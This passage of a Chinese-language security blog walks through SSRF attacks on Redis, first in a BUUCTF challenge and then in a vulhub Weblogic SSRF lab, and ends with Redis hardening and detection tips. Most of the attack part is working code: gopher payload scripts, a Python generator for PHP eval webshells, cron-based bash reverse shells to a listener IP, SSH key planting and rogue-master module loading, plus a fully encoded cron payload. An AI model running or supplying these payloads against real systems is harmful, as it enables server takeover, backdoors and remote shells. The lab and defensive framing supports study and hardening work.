<span class="hljs-comment">// Please visit hint.php locally.</span>
<span class="hljs-meta">?&gt;</span></code></pre>
<p>这里的重点就是针对url的检查，其中的对于用到的协议他规定只能是http、https、gopher与dict，但我们重点需要绕过的是这个：</p>
<pre><code class="hljs php"><span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">ip2long</span>(<span class="hljs-string">'127.0.0.0'</span>)&gt;&gt;<span class="hljs-number">24</span> == <span class="hljs-variable">$int_ip</span>&gt;&gt;<span class="hljs-number">24</span> || <span class="hljs-title function_ invoke__">ip2long</span>(<span class="hljs-string">'10.0.0.0'</span>)&gt;&gt;<span class="hljs-number">24</span> == <span class="hljs-variable">$int_ip</span>&gt;&gt;<span class="hljs-number">24</span> || <span class="hljs-title function_ invoke__">ip2long</span>(<span class="hljs-string">'172.16.0.0'</span>)&gt;&gt;<span class="hljs-number">20</span> == <span class="hljs-variable">$int_ip</span>&gt;&gt;<span class="hljs-number">20</span> || <span class="hljs-title function_ invoke__">ip2long</span>(<span class="hljs-string">'192.168.0.0'</span>)&gt;&gt;<span class="hljs-number">16</span> == <span class="hljs-variable">$int_ip</span>&gt;&gt;<span class="hljs-number">16</span>;
}</code></pre>
<p>这里是将一个标准ip地址转换为二进制形式的长字符串，然后与这里规定的127.0.0.1、10.0.0.0、172.16.0.0、192.168.0.0进行比较，如果有一个为真，则证明标志的ssrf的攻击</p>
<pre><code class="hljs scss"><span class="hljs-comment">// 初始的8的二进制表示，右边有两位空出：</span>
<span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">1000</span>
<span class="hljs-comment">// 执行右移两位后：</span>
<span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0010</span></code></pre>
<p>这里绕过似乎也挺简单的，就是0.0.0.0即可，然后根据题目提示让我们查看hint.php</p>
<pre><code class="hljs http">?url=http://0.0.0.0/hint.php</code></pre>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">'REMOTE_ADDR'</span>]===<span class="hljs-string">"127.0.0.1"</span>){
  <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
}
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'file'</span>])){
  <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'file'</span>],<span class="hljs-string">"&lt;?php echo 'redispass is root';exit();"</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'file'</span>]);
}</code></pre>
<p>随后就是通过file_put_contents函数处理post传参，并且代码中提示我们redis的密码是root，这也提示我们这道题考察的就是如何通过ssrf攻击redis</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231230205726243.png" alt="image-20231230205726243"></p>
<p>这里验证也说明6379的存在，<a target="_blank" rel="noopener" href="http://xn--ghq0cy2jjf78cg9c8uxsoimlb56n0plii4i16j.so">接下来先尝试向其中加载恶意.so</a>，不过需要注意密码的验证，payload如下：</p>
<pre><code class="hljs scss">auth root  #用户认证
config set dir /tmp/  #设置备份目录
config set dbfilename exp<span class="hljs-selector-class">.so</span>   #设置备份文件名
slaveof vpsip vpsport	#设置主从关系，这里的主redis设置为我们的恶意vps
module load /tmp/exp<span class="hljs-selector-class">.so</span>	#从我们的恶意主redis上加载恶意exp<span class="hljs-selector-class">.so</span>
system<span class="hljs-selector-class">.rev</span> vpsip vpsport	#执行system命令，进行反弹shell</code></pre>
<p>但这道题用到的是ssrf，所以上脚本</p>
<pre><code class="hljs py"><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote
<span class="hljs-keyword">import</span> requests
payload = <span class="hljs-string">"""auth root</span>
<span class="hljs-string">config set dir /tmp</span>
<span class="hljs-string">config set dbfilename exp.so</span>
<span class="hljs-string">slaveof vps port</span>
<span class="hljs-string">module load /tmp/exp.so</span>
<span class="hljs-string">system.rev vpsip vpsport</span>
<span class="hljs-string">"""</span>
inner_url = <span class="hljs-string">f"gopher://0.0.0.0:6379/_<span class="hljs-subst">{quote(quote(payload))}</span>"</span>
<span class="hljs-built_in">print</span>(inner_url)
<span class="hljs-comment">#url = "http://e90ce983-16dd-4dff-8850-58a09b264a47.node4.buuoj.cn:81/?url=" + inner_url</span>
<span class="hljs-comment">#resp = requests.get(url)</span>
<span class="hljs-comment">#print(resp.text)</span></code></pre>
<p>发送之前，我们先准备好恶意master，且必须是公网的vps，这里推荐项目：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/Testzero-wz/Awsome-Redis-Rogue-Server/blob/master/redis_rogue_server.py">https://github.com/Testzero-wz/Awsome-Redis-Rogue-Server/blob/master/redis_rogue_server.py</a></p>
<p>上面这个用于需要授权的redis攻击使用</p>
<p><a target="_blank" rel="noopener" href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a>  --这个用于目标redis是未授权的时候使用</p>
<p>这里我们输入如下命令，这里需要将恶意exp.so文件放入<code>redis-rogue-server.py</code>同目录下</p>
<pre><code class="hljs py">python3 redis_rogue_server.py -path exp.so -lhost vps -lport <span class="hljs-number">5555</span>
<span class="hljs-comment">#指定exp.so文件路径 -lhost为我们的vpsip lport设置为vps要监听的端口</span></code></pre>
<p>这里实际上我们是等待被动连接，这里开启了上述服务后，我们构造命令发送</p>
<pre><code class="hljs py"><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote
<span class="hljs-keyword">import</span> requests
<span class="hljs-comment"># auth root</span>
<span class="hljs-comment"># config set dir /tmp</span>
<span class="hljs-comment"># config set dbfilename exp.so</span>
<span class="hljs-comment"># slaveof vps 5555</span>
<span class="hljs-comment"># module load /tmp/exp.so</span>
<span class="hljs-comment"># system.rev vps 8888</span>
payload = <span class="hljs-string">"""auth root</span>
<span class="hljs-string">module load /tmp/exp.so</span>
<span class="hljs-string">system.rev vps 8888</span>
<span class="hljs-string">quit</span>
<span class="hljs-string">"""</span>
inner_url = <span class="hljs-string">f"gopher://0.0.0.0:6379/_<span class="hljs-subst">{quote(quote(payload))}</span>"</span>
<span class="hljs-built_in">print</span>(inner_url)</code></pre>
<p>这里我是分了两批payload发送，一起发送也是可以的，不过就得发送两次了，这里将得到的payload发送到ssrf漏洞点，接着就会发现我们的恶意服务收到了连接请求，但要注意在vps上开启接受反弹shell的端口。</p>
<p>最后就会发现我们成功拿到shell，这里不知为何截图都没了，懒得在搞了。</p>
<p>吐槽一手：buu题目环境害人啊，我一直不成功，还以为是我思路有问题，一直想不出来。。。。</p>
<h2 id="weblogic-ssrf漏洞">Weblogic SSRF漏洞</h2>
<h3 id="简介">简介</h3>
<p>WebLogic是美国Oracle公司出品的一个application server确切的说是一个基于JAVAEE架构的中间件，BEA WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。</p>
<p>Weblogic中存在一个SSRF漏洞，利用该漏洞可以发送任意HTTP请求，进而攻击内网中redis、fastcgi等脆弱组件。</p>
<p>影响范围：</p>
<pre><code class="hljs plaintext">weblogic 版本10.0.2

weblogic 版本10.3.6</code></pre>
<h3 id="漏洞复现">漏洞复现</h3>
<p>复现环境：<a target="_blank" rel="noopener" href="https://vulhub.org/#/environments/weblogic/ssrf/">https://vulhub.org/#/environments/weblogic/ssrf/</a></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231231145729676.png" alt="image-20231231145729676"></p>
<p>如上图代表成功启动，这里我们直接bp抓个包，这里我先用dirsearch扫个目录</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231231150520292.png" alt="image-20231231150520292"></p>
<p>可以发现还是有很多的，这里测试一番发现uddi这个目录很可疑</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231231150543048.png" alt="image-20231231150543048"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231231150910443.png" alt="image-20231231150910443"></p>
<p>如上图，这里似乎是个未授权访问，点击第一个连接的search抓包发现，如下图存在一个url链接</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231231151343200.png" alt="image-20231231151343200"></p>
<p>这里修改个参数值为127.0.0.1，如下图发现其好像在尝试连接这个地址，我们探测一下端口存活情况</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231231151722586.png" alt="image-20231231151722586"></p>
<p>bp爆破端口之后发现下图，这里并没有探测到什么重点端口，这里我就不会了，看了wp发现，比我想的更复杂，这里需要探测内网。。而我只是单纯探测个端口而已</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231231152152338.png" alt="image-20231231152152338"></p>
<p>这里顺便补充一个资料：2016乌云大会上猪猪侠师傅介绍的《WebLogic SSRF 服务探测》</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231231152421261.png" alt="image-20231231152421261"></p>
<p>接下来就进行内网ip的探测，不过这里需要注意的是我们是用docker搭建的，因此探测的时候应该使用docker的ip段来探测</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231231152729324.png" alt="image-20231231152729324"></p>
<p>我们开始设置爆破格式，自定义迭代器的payload类型</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231231152918892.png" alt="image-20231231152918892"></p>
<p>这里在1中输入172，然后下方添加.分隔符</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231231152940854.png" alt="image-20231231152940854"></p>
<p>位置2填入17与分隔符.  这里搞错了，对我的靶机来说是该填入19的</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231231153015380.png" alt="image-20231231153015380"></p>
<p>位置三设置0-255与分隔符.  然后位置4设置0-255，但不需要设置分隔符</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231231154011663.png" alt="image-20231231154011663"></p>
<p>开始爆破，结果如下图所示，这里的爆破就说明我们的ip是存在的，但是对应的端口不存在，那我们直接探测该ip的端口存活情况即可</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231231155336238.png" alt="image-20231231155336238"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231231155534328.png" alt="image-20231231155534328"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231231155539276.png" alt="image-20231231155539276"></p>
<p>设置好开始爆破，如下图所示，这里的报错说明我们的端口是存活的</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231231155623106.png" alt="image-20231231155623106"></p>
<p>Weblogic的SSRF有一个比较大的特点，就是我们可以通过传入<code>%0a%0d</code>来注入换行符，而某些服务（如redis）是通过换行符来分隔每条命令，也就说我们可以通过该SSRF攻击内网中的redis服务器。</p>
<p>那接下来我们尝试写入定时任务反弹shell</p>
<pre><code class="hljs py"><span class="hljs-comment">#!/usr/local/bin python</span>
<span class="hljs-comment"># coding=utf8</span>

<span class="hljs-keyword">try</span>:
    <span class="hljs-keyword">from</span> urllib <span class="hljs-keyword">import</span> quote
<span class="hljs-keyword">except</span>:
    <span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote


<span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_info</span>(<span class="hljs-params">passwd</span>):
    cmd = [
        <span class="hljs-string">"info"</span>,
        <span class="hljs-string">"quit"</span>
    ]
    <span class="hljs-keyword">if</span> passwd:
        cmd.insert(<span class="hljs-number">0</span>, <span class="hljs-string">"AUTH {}"</span>.<span class="hljs-built_in">format</span>(passwd))
    <span class="hljs-keyword">return</span> cmd


<span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_shell</span>(<span class="hljs-params">filename, path, passwd, payload</span>):
    cmd = [<span class="hljs-string">"flushall"</span>,
           <span class="hljs-string">"set 1 {}"</span>.<span class="hljs-built_in">format</span>(payload),
           <span class="hljs-string">"config set dir {}"</span>.<span class="hljs-built_in">format</span>(path),
           <span class="hljs-string">"config set dbfilename {}"</span>.<span class="hljs-built_in">format</span>(filename),
           <span class="hljs-string">"save"</span>,
           <span class="hljs-string">"quit"</span>
           ]
    <span class="hljs-keyword">if</span> passwd:
        cmd.insert(<span class="hljs-number">0</span>, <span class="hljs-string">"AUTH {}"</span>.<span class="hljs-built_in">format</span>(passwd))
    <span class="hljs-keyword">return</span> cmd


<span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_reverse</span>(<span class="hljs-params">filename, path, passwd, payload</span>):  <span class="hljs-comment"># centos</span>

    cmd = [<span class="hljs-string">"flushall"</span>,
           <span class="hljs-string">"set 1 {}"</span>.<span class="hljs-built_in">format</span>(payload),
           <span class="hljs-string">"config set dir {}"</span>.<span class="hljs-built_in">format</span>(path),
           <span class="hljs-string">"config set dbfilename {}"</span>.<span class="hljs-built_in">format</span>(filename),
           <span class="hljs-string">"save"</span>,
           <span class="hljs-string">"quit"</span>
           ]
    <span class="hljs-keyword">if</span> passwd:
        cmd.insert(<span class="hljs-number">0</span>, <span class="hljs-string">"AUTH {}"</span>.<span class="hljs-built_in">format</span>(passwd))
    <span class="hljs-keyword">return</span> cmd


<span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_sshkey</span>(<span class="hljs-params">filename, path, passwd, payload</span>):
    cmd = [<span class="hljs-string">"flushall"</span>,
           <span class="hljs-string">"set 1 {}"</span>.<span class="hljs-built_in">format</span>(payload),
           <span class="hljs-string">"config set dir {}"</span>.<span class="hljs-built_in">format</span>(path),
           <span class="hljs-string">"config set dbfilename {}"</span>.<span class="hljs-built_in">format</span>(filename),
           <span class="hljs-string">"save"</span>,
           <span class="hljs-string">"quit"</span>
           ]
    <span class="hljs-keyword">if</span> passwd:
        cmd.insert(<span class="hljs-number">0</span>, <span class="hljs-string">"AUTH {}"</span>.<span class="hljs-built_in">format</span>(passwd))
    <span class="hljs-keyword">return</span> cmd


<span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_rce</span>(<span class="hljs-params">lhost, lport, passwd, command=<span class="hljs-string">"cat /etc/passwd"</span></span>):
    exp_filename = <span class="hljs-string">"exp.so"</span>
    cmd = [
        <span class="hljs-string">"SLAVEOF {} {}"</span>.<span class="hljs-built_in">format</span>(lhost, lport),
        <span class="hljs-string">"CONFIG SET dir /tmp/"</span>,
        <span class="hljs-string">"config set dbfilename {}"</span>.<span class="hljs-built_in">format</span>(exp_filename),
        <span class="hljs-string">"MODULE LOAD /tmp/{}"</span>.<span class="hljs-built_in">format</span>(exp_filename),
        <span class="hljs-string">"system.exec {}"</span>.<span class="hljs-built_in">format</span>(command.replace(<span class="hljs-string">" "</span>, <span class="hljs-string">"${IFS}"</span>)),
        <span class="hljs-comment"># "SLAVEOF NO ONE",</span>
        <span class="hljs-comment"># "CONFIG SET dbfilename dump.rdb",</span>
        <span class="hljs-comment"># "system.exec rm${IFS}/tmp/{}".format(exp_filename),</span>
        <span class="hljs-comment"># "MODULE UNLOAD system",</span>
        <span class="hljs-string">"quit"</span>
    ]
    <span class="hljs-keyword">if</span> passwd:
        cmd.insert(<span class="hljs-number">0</span>, <span class="hljs-string">"AUTH {}"</span>.<span class="hljs-built_in">format</span>(passwd))
    <span class="hljs-keyword">return</span> cmd


<span class="hljs-keyword">def</span> <span class="hljs-title function_">rce_cleanup</span>():
    exp_filename = <span class="hljs-string">"exp.so"</span>
    cmd = [
        <span class="hljs-string">"SLAVEOF NO ONE"</span>,
        <span class="hljs-string">"CONFIG SET dbfilename dump.rdb"</span>,
        <span class="hljs-string">"system.exec rm /tmp/{}"</span>.<span class="hljs-built_in">format</span>(exp_filename).replace(<span class="hljs-string">" "</span>, <span class="hljs-string">"${IFS}"</span>),
        <span class="hljs-string">"MODULE UNLOAD system"</span>,
        <span class="hljs-string">"quit"</span>
    ]
    <span class="hljs-keyword">if</span> passwd:
        cmd.insert(<span class="hljs-number">0</span>, <span class="hljs-string">"AUTH {}"</span>.<span class="hljs-built_in">format</span>(passwd))
    <span class="hljs-keyword">return</span> cmd


<span class="hljs-keyword">def</span> <span class="hljs-title function_">redis_format</span>(<span class="hljs-params">arr</span>):
    CRLF = <span class="hljs-string">"\r\n"</span>
    redis_arr = arr.split(<span class="hljs-string">" "</span>)
    cmd = <span class="hljs-string">""</span>
    cmd += <span class="hljs-string">"*"</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(redis_arr))
    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> redis_arr:
        cmd += CRLF + <span class="hljs-string">"$"</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>((x))) + CRLF + x
    cmd += CRLF
    <span class="hljs-keyword">return</span> cmd


<span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_payload</span>(<span class="hljs-params">passwd, mode</span>):
    payload = <span class="hljs-string">"test"</span>

    <span class="hljs-keyword">if</span> mode == <span class="hljs-number">0</span>:
        filename = <span class="hljs-string">"shell.php"</span>
        path = <span class="hljs-string">"/var/www/html"</span>
        shell = <span class="hljs-string">"\n\n&lt;?=eval($_GET[0]);?&gt;\n\n"</span>

        cmd = generate_shell(filename, path, passwd, shell)

    <span class="hljs-keyword">elif</span> mode == <span class="hljs-number">1</span>:
        filename = <span class="hljs-string">"root"</span>
        path = <span class="hljs-string">"/var/spool/cron/"</span>
        shell = <span class="hljs-string">"\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/192.168.246.130/5555 0&gt;&amp;1\n\n"</span>

        cmd = generate_reverse(filename, path, passwd, shell.replace(<span class="hljs-string">" "</span>, <span class="hljs-string">"^"</span>))

    <span class="hljs-keyword">elif</span> mode == <span class="hljs-number">2</span>:
        filename = <span class="hljs-string">"authorized_keys"</span>
        path = <span class="hljs-string">"/root/.ssh/"</span>
        pubkey = <span class="hljs-string">"\n\nssh-rsa "</span>

        cmd = generate_sshkey(filename, path, passwd, pubkey.replace(<span class="hljs-string">" "</span>, <span class="hljs-string">"^"</span>))

    <span class="hljs-keyword">elif</span> mode == <span class="hljs-number">3</span>:
        lhost = <span class="hljs-string">"124.220.233.26"</span>
        lport = <span class="hljs-string">"5555"</span>
        command = <span class="hljs-string">"ls /"</span>

        cmd = generate_rce(lhost, lport, passwd, command)

    <span class="hljs-keyword">elif</span> mode == <span class="hljs-number">31</span>:
        cmd = rce_cleanup()

    <span class="hljs-keyword">elif</span> mode == <span class="hljs-number">4</span>:
        cmd = generate_info(passwd)

    protocol = <span class="hljs-string">"gopher://"</span>

    ip = <span class="hljs-string">"0.0.0.0"</span>
    port = <span class="hljs-string">"6379"</span>

    payload = protocol + ip + <span class="hljs-string">":"</span> + port + <span class="hljs-string">"/_"</span>

    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> cmd:
        payload += quote(quote(redis_format(x).replace(<span class="hljs-string">"^"</span>, <span class="hljs-string">" "</span>)))
    <span class="hljs-keyword">return</span> payload


<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    <span class="hljs-comment"># 0 for webshell ; 1 for re shell ; 2 for ssh key ;</span>
    <span class="hljs-comment"># 3 for redis rce ; 31 for rce clean up</span>
    <span class="hljs-comment"># 4 for info</span>
    <span class="hljs-comment"># suggest cleaning up when mode 3 used</span>
    mode = <span class="hljs-number">1</span>

    <span class="hljs-comment"># input auth passwd or leave blank for no pw</span>
    passwd = <span class="hljs-string">''</span>

    p = generate_payload(passwd, mode)
    <span class="hljs-built_in">print</span>(p)</code></pre>
<p>选择模式1，这里只需要一次编码即可</p>
<pre><code class="hljs plaintext">aaa%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2461%0D%0A%0A%0A%2A/1%20%2A%20%2A%20%2A%20%2A%20bash%20-i%20%3E%26%20/dev/tcp/192.168.246.130/5555%200%3E%261%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2416%0D%0A/var/spool/cron/%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Aroot%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%2A1%0D%0A%244%0D%0Aquit%0D%0Aaaa</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231231160714720.png" alt="image-20231231160714720"></p>
<p>如上图成功反弹shell，这里有点懵逼的是，我看那些师傅都在payload前后加个aaa的无用字符，不知道为何，我这里删除之后测试，依旧可以反弹shell。。。搜了多个文章也无果，希望日后可以解惑吧</p>
<pre><code class="hljs scss">docker exec -it <span class="hljs-number">4</span>cfd33d77a1c ip addr</code></pre>
<p>这里我们可以通过上述命令来得知docker容器的ip地址。</p>
<h1 id="0x07-修复建议">0x07 修复建议</h1>
<p>① Redis设置访问白名单(入 防止恶意访问和出 防止恶意设置为主从)</p>
<p>② Redis添加认证</p>
<pre><code class="hljs plaintext">在配置文件/etc/redis/redis.conf中修改requirepasss属性为强口令，完成后重启服务器

动态命令设置config set requirepass YorPass</code></pre>
<p>③ 重命名相关命令</p>
<pre><code class="hljs plaintext">在配置文件/etc/redis/redis.conf中

rename-command CONFIG PDZA1DA也可以rename-command CONFIG "" 设置为空来禁用</code></pre>
<p>对于恶意特征，可以通过MODULE LIST命令查看当前加载的模块信息，重点关注非官方加载或者SYSTEM、EXEC等恶意关键词，监控Redis服务器上Redis进程写入的so文件（Windows为DLL文件），流量中可以重点关注FULLRESYNC命令以及相关文件二进制特征（Webshell，Cron，Authorized_keys，so和DLL等）。</p>
<h1 id="0x08-知识总结">0x08 知识总结</h1>
<h2 id="dict协议使用注意事项">Dict协议使用注意事项</h2>
<ol>
<li>Dict协议中可以用:代替空格</li>
<li>?会截断后面的内容(写马的情况下要想办法bypass “?”)</li>
<li>dict协议一次只能发送一条数据</li>
</ol>
<h2 id="crontab写入tips">crontab写入Tips</h2>
<ul>
<li><code>/etc/crontab</code></li>
<li><code>/etc/cron.d/*</code>：将任意文件写到该目录下，效果和crontab相同，格式也要一致，并且在该目录操作可以做到不覆盖任何其他文件的情况进行弹shell；</li>
<li><code>/var/spool/cron/root</code>：CentOS系统下root用户的cron文件；</li>
<li><code>/var/spool/cron/crontabs/root</code>：Debian系统下root用户的cron文件；</li>
</ul>
<h1 id="0x09-参考文章">0x09 参考文章</h1>
